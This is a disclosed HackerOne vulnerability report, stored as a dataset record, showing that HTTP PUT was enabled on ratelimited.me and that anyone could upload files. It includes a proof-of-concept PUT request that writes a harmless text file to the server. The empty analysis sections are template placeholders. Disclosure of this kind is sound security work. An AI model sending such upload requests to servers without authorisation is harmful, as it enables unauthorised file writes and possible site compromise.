---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '369581'
original_report_id: '369581'
title: HTTP PUT method enabled
weakness: Improper Access Control - Generic
team_handle: ratelimited
created_at: '2018-06-21T15:57:50.449Z'
disclosed_at: '2018-12-11T15:55:47.812Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 42
asset_identifier: '*.ratelimited.me'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# HTTP PUT method enabled

## Metadata

- HackerOne Report ID: 369581
- Weakness: Improper Access Control - Generic
- Program: ratelimited
- Disclosed At: 2018-12-11T15:55:47.812Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi security team,

**Summary:** It is possible to upload files to the server using the PUT method

## Steps To Reproduce:

1. I used the following request:

```
PUT /emitrani.txt HTTP/1.1
Host: ratelimited.me
Content-Length: 10
Connection: close

emitrani POC
```
Now a file exists at https://ratelimited.me/emitrani.txt
with contents of the put request.

## Impact

Anyone can upload files to the server.

Regards,
Eray

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
